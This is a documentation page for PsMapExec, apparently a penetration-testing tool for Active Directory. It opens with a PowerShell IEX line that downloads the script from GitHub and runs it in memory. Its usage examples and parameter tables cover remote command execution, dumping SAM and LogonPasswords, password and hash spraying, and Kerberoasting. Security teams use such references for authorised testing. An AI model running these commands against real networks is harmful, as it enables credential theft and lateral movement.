# 🔵 PsMapExec

<figure><img src="../.gitbook/assets/279332478-14770c85-b751-4127-8261-2e49ff25a8ad.png" alt="" width="375"><figcaption></figcaption></figure>

**Get it on GitHub:** [https://github.com/The-Viper-One/PsMapExec](https://github.com/The-Viper-One/PsMapExec)

```powershell
# Load directly into memory and execute
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

## Usage Examples

```powershell
# Execute WMI commands over all systems in the domain using password authentication
 PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""

# Execute WinRM commands over all systems in the domain using hash authentication
PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""

# Check RDP Access against workstations in the domain and using local authentication
PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
 
# Dump SAM on a single system using SMB and a -ticket for authentication
PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM

# Check SMB Signing on all domain systems
PsMapExec -Targets All -Method GenRelayList

# Dump LogonPasswords on all Domain Controllers over WinRM
PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords

# Use WMI to check current user admin access from systems read from a text file
PsMapExec -Targets C:\temp\Systems.txt -Method WMI

# Spray passwords across all accounts in the domain
PsMapExec -Method Spray -SprayPassword [Password]

# Spray Hashes across all accounts in the domain
PsMapExec -Method Spray -SprayHash [Hash]

# Spray Hashes across all Domain Admin group users
PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]

# Kerberoast 
PsMapExec -Method Kerberoast -ShowOutput

# IPMI
PsMapExec -Targets 192.168.1.0/24 IPMI
```

## Usage Parameters

### General Parameters

<table><thead><tr><th width="199">Parameter</th><th width="112">Value</th><th>Description</th></tr></thead><tbody><tr><td>-Command</td><td>whoami</td><td>Runs the specified command on the remote system</td></tr><tr><td>-CurrentUser</td><td>N/A</td><td>Instructs PsMapExec to run in current user context. This is default when no other credentials are specified</td></tr><tr><td>-Domain</td><td>[Domain]</td><td>Specifies what domain to run against. Otherwise the current user domain is used</td></tr><tr><td>-DomainController</td><td>[DC]</td><td>Specifies what Domain controller to authenticate against</td></tr><tr><td>-Force</td><td>N/A</td><td>Used to force PsMapExec to run when domain or enterprise admin credentials are used</td></tr><tr><td>-Flush</td><td>N/A</td><td>Flushes stored LDAP variables. Mostly only needed if working in a long term shell in a large enivronment where new computers and users may be added to the domain over time. </td></tr><tr><td>-Module</td><td>[Module]</td><td>Specifies the module to be used for command execution</td></tr><tr><td>-NoBanner</td><td>N/A</td><td>Surpresses the script banner</td></tr><tr><td>-NoParse</td><td>N/A</td><td>Surpresses parsing of some module outputs</td></tr><tr><td>-Rainbow</td><td>N/A</td><td>Queries an online rainbow table from dumped hashes with the modules "Sam, LogonPasswords and NTDS".</td></tr><tr><td>-SuccessOnly</td><td>N/A</td><td>Shows only successful results</td></tr><tr><td>-Timeout</td><td>[int]</td><td>Sets the port scan timeout (ms) against the specified method.</td></tr><tr><td>-Threads</td><td>[int]</td><td>Sets the concurrent executions jobs to run (Default:30)</td></tr></tbody></table>



### Authentication Parameters

<table><thead><tr><th width="156">Parameter</th><th width="235">Value</th><th>Description</th></tr></thead><tbody><tr><td>-Hash</td><td>[RC4] or [AES256]</td><td>Hash value. Must be supplied with -Username</td></tr><tr><td>-LocalAuth</td><td>N/A</td><td>Used to specify when local account authentication should be used</td></tr><tr><td>-Password</td><td>[Password]</td><td>Password value. Must be suplied with -Username</td></tr><tr><td>-Ticket</td><td>[Ticket] or [Path to ticket]</td><td>B64 encoded Kerberos ticket to use for authentication. -Username is not required</td></tr></tbody></table>

### Command execution Parameters



<table><thead><tr><th width="226">Parameter</th><th width="129">Value</th><th>Description</th></tr></thead><tbody><tr><td>-Command</td><td>[Command]</td><td>Runs the specified command on the remote system</td></tr><tr><td>-Module</td><td>[Module]</td><td>Specifies the module to be used for command execution</td></tr><tr><td>-ShowOutput</td><td>N/A</td><td>Displays output for executed modules. Commands will still be shown</td></tr></tbody></table>

### Spraying Parameters

<table><thead><tr><th width="217">Parameter</th><th width="166">Value</th><th>Description</th></tr></thead><tbody><tr><td>-AccountAsPassword</td><td>N/A</td><td>Sprays SAM Account name values as passwords</td></tr><tr><td>-EmptyPassword</td><td>N/A</td><td>Sprays "blank" passwords</td></tr><tr><td>-SprayHash</td><td>[RC4] or [AES256]</td><td>Hash value to be used for hash spraying</td></tr><tr><td>-SprayPassword</td><td>[Password]</td><td>Password value to be used for hash spraying</td></tr></tbody></table>



Most of these have additional documentation that delves into more detail about each (Available on the left-hand sidebar of this page).

Generally, you can mix and match various parameters across different methods and modules.

##

